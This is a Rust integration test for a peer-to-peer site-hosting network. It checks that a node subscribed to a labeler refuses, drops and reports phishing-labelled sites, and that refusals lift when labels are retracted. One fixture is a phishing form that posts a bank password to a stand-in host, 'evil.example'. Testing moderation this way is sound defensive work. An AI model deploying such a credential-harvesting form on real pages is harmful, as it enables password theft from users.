//! DIP-0036 step 4 on loopback libp2p: one of four hosting nodes subscribes
//! to a labeler with `phishing = "refuse"`.
//!
//! * A site with a labelled file: that node fetches it, puts the files back
//!   together, asks its labeler and refuses. It never announces a copy, the
//!   three other nodes hold the site, and the owner sees one refused replica
//!   with the labeler and value, not the peer.
//! * A site labelled after the node took a copy: the node lets the copy go
//!   on its next check, the fourth node takes over, and again the owner sees
//!   the count.
//! * The labeler retracts: the refusal is lifted everywhere.

use std::collections::BTreeMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use base64::Engine as _;
use c0mpute_core::hosting::replicas::{RefusalTally, chosen};
use c0mpute_core::hosting::site::{BuiltSite, SiteRecord, build_from_dir, owner_hex, site_id_for};
use c0mpute_core::hosting::{Hosting, Options, Timing};
use c0mpute_core::moderation::{Action, Gate, Label, LabelerClient, LabelerSource, ModerationConfig, canonical};
use c0mpute_net::libp2p::identity::ed25519;
use c0mpute_net::{ChunkSource, Libp2pNetwork, NetworkConfig};
use c0mpute_proto::Hash;
use c0mpute_store::ChunkStore;
use futures::future::{BoxFuture, FutureExt};
use libp2p::multiaddr::Protocol;
use sha2::{Digest, Sha256};
use tempfile::tempdir;

const DID: &str = "did:web:labeler.test";

struct StoreSource(ChunkStore);

#[async_trait::async_trait]
impl ChunkSource for StoreSource {
    async fn read_chunk(&self, hash: &Hash) -> anyhow::Result<Vec<u8>> {
        self.0.get(hash).await
    }
}

async fn node(dir: &std::path::Path, bootstrap: Vec<libp2p::Multiaddr>) -> (Arc<Libp2pNetwork>, ChunkStore) {
    let store = ChunkStore::open(dir.join("store")).await.unwrap();
    let net = Libp2pNetwork::spawn(
        NetworkConfig::for_dir(dir.join("id"))
            .with_listen(vec!["/ip4/127.0.0.1/tcp/0".parse().unwrap()])
            .with_local_source(Arc::new(StoreSource(store.clone())))
            .with_bootstrap(bootstrap),
    )
    .await
    .unwrap();
    (Arc::new(net), store)
}

async fn listen_addr(net: &Libp2pNetwork) -> libp2p::Multiaddr {
    for _ in 0..50 {
        if let Ok(addrs) = net.listen_addrs().await
            && let Some(a) = addrs.into_iter().next()
        {
            return a.with(Protocol::P2p(net.peer_id()));
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    panic!("no listen addr");
}

fn fast() -> Timing {
    Timing {
        announce_every: Duration::from_millis(700),
        records_every: Duration::from_millis(1500),
        repair_every: Duration::from_millis(500),
        holder_ttl: Duration::from_secs(4),
        fetch_timeout: Duration::from_secs(20),
    }
}

async fn wait_for<F, Fut>(what: &str, secs: u64, mut f: F)
where
    F: FnMut() -> Fut,
    Fut: std::future::Future<Output = bool>,
{
    let deadline = tokio::time::Instant::now() + Duration::from_secs(secs);
    while tokio::time::Instant::now() < deadline {
        if f().await {
            return;
        }
        tokio::time::sleep(Duration::from_millis(250)).await;
    }
    panic!("timed out waiting for {what}");
}

/// A labeler that answers every question with the labels it has right now.
struct Labeler {
    key: ed25519::Keypair,
    labels: Mutex<Vec<Label>>,
}

impl Labeler {
    fn label(&self, file: &[u8], val: &str) {
        let mut l = Label {
            src: DID.into(),
            uri: format!("sha256:{}", hex::encode(Sha256::digest(file))),
            val: val.into(),
            neg: false,
            cts: "2026-01-01T00:00:00Z".into(),
            exp: "2099-01-01T00:00:00Z".into(),
            evidence: None,
            sig: String::new(),
        };
        let sig = self.key.sign(canonical(&l).unwrap().as_bytes());
        l.sig = base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(sig);
        self.labels.lock().unwrap().push(l);
    }

    fn answer(&self) -> BoxFuture<'static, Result<Vec<Label>, String>> {
        let labels = self.labels.lock().unwrap().clone();
        async move { Ok(labels) }.boxed()
    }
}

impl LabelerClient for Labeler {
    fn scan(&self, _: &LabelerSource, _: &str, _: &str, _: &[u8]) -> BoxFuture<'static, Result<Vec<Label>, String>> {
        self.answer()
    }
    fn query(&self, _: &LabelerSource, _: &str) -> BoxFuture<'static, Result<Vec<Label>, String>> {
        self.answer()
    }
    fn query_many(&self, _: &LabelerSource, _: &[String]) -> BoxFuture<'static, Result<Vec<Label>, String>> {
        self.answer()
    }
}

/// A two-file site under a name for which `peer` is one of the three nodes
/// that take a copy (the fill is rendezvous-ranked on the site id).
fn site_for(
    dir: &std::path::Path,
    owner: &libp2p::identity::Keypair,
    prefix: &str,
    page: &[u8],
    peers: &[String],
    peer: &str,
) -> (BuiltSite, SiteRecord) {
    let owner_key = owner_hex(owner).unwrap();
    let name = (0..200)
        .map(|i| format!("{prefix}-{i}"))
        .find(|n| chosen(&site_id_for(&owner_key, n), peers, 3).iter().any(|p| p == peer))
        .expect("a name the policy node ranks for");
    std::fs::create_dir_all(dir).unwrap();
    std::fs::write(dir.join("index.html"), format!("<h1>{name}</h1>")).unwrap();
    std::fs::write(dir.join("page.html"), page).unwrap();
    let built = build_from_dir(dir, &name).unwrap();
    let rec = SiteRecord::sign(
        owner,
        &name,
        &Hash::of(&built.manifest.to_bytes()),
        1,
        built.manifest.total_bytes(),
        vec![],
    )
    .unwrap();
    (built, rec)
}

fn one_refused(val: &str) -> Vec<RefusalTally> {
    vec![RefusalTally {
        labeler: DID.into(),
        val: val.into(),
        count: 1,
    }]
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_worker_refuses_labelled_sites_and_the_owner_sees_the_count() {
    let _ = tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "c0mpute_core=info,c0mpute_net=warn".into()),
        )
        .with_test_writer()
        .try_init();
    // The test runs beside live workers: keep its mesh off the LAN.
    unsafe { std::env::set_var("C0MPUTE_DISABLE_MDNS", "1") };
    let tmp = tempdir().unwrap();

    let labeler = Arc::new(Labeler {
        key: ed25519::Keypair::generate(),
        labels: Mutex::new(Vec::new()),
    });
    let gate = Gate::new(
        ModerationConfig {
            labelers: vec![LabelerSource {
                url: "https://labeler.test".into(),
                did: DID.into(),
                public_key: base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(labeler.key.public().to_bytes()),
                token_env: String::new(),
                appeal: "appeals@labeler.test".into(),
            }],
            actions: BTreeMap::from([("phishing".to_string(), Action::Refuse)]),
            // The shortest re-check the gate allows.
            recheck_secs: 30,
            ..Default::default()
        },
        labeler.clone(),
    )
    .expect("a policy with a labeler and a refusing action");

    // Four hosting nodes; the first one has the policy.
    let opts = |dir: &std::path::Path, moderation: Option<Arc<Gate>>| Options {
        hosts: true,
        disk_override: Some((1 << 40, 2 << 40)),
        catalog_path: Some(dir.join("catalog.json")),
        timing: fast(),
        moderation,
        ..Default::default()
    };
    let d0 = tmp.path().join("h0");
    let (hub_net, policy_store) = node(&d0, vec![]).await;
    let mut mesh_addrs = vec![listen_addr(&hub_net).await];
    let mut mesh_nets = vec![hub_net.clone()];
    let mut hosts: Vec<Hosting> = vec![
        Hosting::start(hub_net, policy_store.clone(), opts(&d0, Some(gate)))
            .await
            .unwrap(),
    ];
    for i in 1..4 {
        let d = tmp.path().join(format!("h{i}"));
        let (n, s) = node(&d, mesh_addrs.clone()).await;
        mesh_addrs.push(listen_addr(&n).await);
        mesh_nets.push(n.clone());
        hosts.push(Hosting::start(n, s, opts(&d, None)).await.unwrap());
    }
    let (pn, ps) = node(&tmp.path().join("pub"), mesh_addrs).await;
    mesh_nets.push(pn.clone());
    let publisher = Hosting::start(
        pn,
        ps,
        Options {
            hosts: false,
            timing: fast(),
            ..Default::default()
        },
    )
    .await
    .unwrap();
    let mesh = mesh_nets.clone();
    wait_for("full loopback mesh", 30, || {
        let mesh = mesh.clone();
        async move {
            let expected = mesh.len() - 1;
            let mut connected = true;
            for n in &mesh {
                connected &= n.connected_peers().await.len() >= expected;
            }
            connected
        }
    })
    .await;
    tokio::time::sleep(Duration::from_secs(3)).await;

    let policy_peer = hosts[0].peer_id().to_string();
    let peers: Vec<String> = hosts.iter().map(|h| h.peer_id().to_string()).collect();
    let owner = libp2p::identity::Keypair::generate_ed25519();

    // ── a site that is labelled before anyone holds it ───────────────────
    let phish = b"<form action=//evil.example>your bank password</form>".to_vec();
    labeler.label(&phish, "phishing");
    let (built, rec) = site_for(&tmp.path().join("pre"), &owner, "pre", &phish, &peers, &policy_peer);
    let pre = rec.site_id.clone();
    publisher.publish_site(&built, rec.clone()).await.unwrap();
    {
        let (p, s, rec, policy_peer) = (publisher.clone(), pre.clone(), rec.clone(), policy_peer.clone());
        wait_for("three copies on the nodes without the policy", 90, move || {
            let (p, s, rec, policy_peer) = (p.clone(), s.clone(), rec.clone(), policy_peer.clone());
            async move {
                p.regossip(&rec).await;
                let holders = p.holders(&s).await;
                assert!(!holders.contains(&policy_peer), "the refusing node announced a copy");
                holders.len() == 3 && p.refusals(&s).await == one_refused("phishing")
            }
        })
        .await;
    }
    // Every node agrees on who refused how often; none of it names a peer.
    for h in &hosts {
        let (h, s) = (h.clone(), pre.clone());
        wait_for("the refusal reaching every node", 30, move || {
            let (h, s) = (h.clone(), s.clone());
            async move { h.refusals(&s).await == one_refused("phishing") }
        })
        .await;
    }
    // The chunks it fetched to judge the site are gone again.
    let chunk = Hash::from_hex(&built.manifest.files["page.html"].chunks[0]).unwrap();
    {
        let store = policy_store.clone();
        wait_for("the refused copy's chunks being deleted", 30, move || {
            let store = store.clone();
            async move { !store.has(&chunk).await }
        })
        .await;
    }
    // The public site list carries the count and the cause.
    {
        use tower::ServiceExt;
        let res = publisher
            .router()
            .oneshot(
                axum::http::Request::builder()
                    .uri("/hosting/v1/sites")
                    .body(axum::body::Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        let body = axum::body::to_bytes(res.into_body(), 1 << 20).await.unwrap();
        let listing: serde_json::Value = serde_json::from_slice(&body).unwrap();
        let entry = listing["sites"]
            .as_array()
            .unwrap()
            .iter()
            .find(|s| s["site_id"] == pre.as_str())
            .expect("the site is listed");
        assert_eq!(entry["copies"], 3);
        assert_eq!(entry["refused"], 1);
        assert_eq!(
            entry["refused_by"],
            serde_json::json!([{ "labeler": DID, "val": "phishing", "count": 1 }])
        );
        assert!(!body.windows(policy_peer.len()).any(|w| w == policy_peer.as_bytes()));
    }

    // ── a site that is labelled after the node took a copy ───────────────
    let late_page = b"<p>harmless until someone looks closer</p>".to_vec();
    let (built, rec) = site_for(&tmp.path().join("late"), &owner, "late", &late_page, &peers, &policy_peer);
    let late = rec.site_id.clone();
    publisher.publish_site(&built, rec.clone()).await.unwrap();
    {
        let (p, s, rec, policy_peer) = (publisher.clone(), late.clone(), rec.clone(), policy_peer.clone());
        wait_for("three copies, one on the node with the policy", 90, move || {
            let (p, s, rec, policy_peer) = (p.clone(), s.clone(), rec.clone(), policy_peer.clone());
            async move {
                p.regossip(&rec).await;
                let holders = p.holders(&s).await;
                holders.len() == 3 && holders.contains(&policy_peer)
            }
        })
        .await;
    }
    assert!(publisher.refusals(&late).await.is_empty());
    labeler.label(&late_page, "phishing");
    {
        let (p, s, rec, policy_peer) = (publisher.clone(), late.clone(), rec.clone(), policy_peer.clone());
        wait_for("the labelled copy being let go and replaced", 120, move || {
            let (p, s, rec, policy_peer) = (p.clone(), s.clone(), rec.clone(), policy_peer.clone());
            async move {
                p.regossip(&rec).await;
                let holders = p.holders(&s).await;
                holders.len() == 3 && !holders.contains(&policy_peer) && p.refusals(&s).await == one_refused("phishing")
            }
        })
        .await;
    }

    // ── the labeler retracts ─────────────────────────────────────────────
    labeler.labels.lock().unwrap().clear();
    for s in [pre.clone(), late.clone()] {
        let p = publisher.clone();
        wait_for("the refusal being lifted", 120, move || {
            let (p, s) = (p.clone(), s.clone());
            async move { p.refusals(&s).await.is_empty() }
        })
        .await;
    }
    for h in hosts {
        h.stop();
    }
    publisher.stop();
}
